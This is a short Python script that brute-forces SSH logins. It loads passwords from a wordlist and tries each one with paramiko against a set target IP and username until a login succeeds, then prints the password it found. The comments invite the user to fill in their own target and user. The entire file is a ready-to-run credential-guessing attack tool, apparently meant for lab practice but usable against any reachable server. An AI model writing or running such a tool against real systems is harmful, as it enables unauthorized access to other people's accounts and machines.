import paramiko
import time

target = "192.168.56.2" # Put The Target IP 
username = "admin" # Put the User Target

with open("wordlist.txt", "r") as file:
    passwords = file.read().splitlines()

for password in passwords:

    try:
        print(f"[+] Trying: {password}")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(
            hostname=target,
            username=username,
            password=password,
            timeout=3
        )

        print(f"[SUCCESS] Password found: {password}")
        ssh.close()
        break

    except Exception:
        print("[FAILED]")

    time.sleep(3)
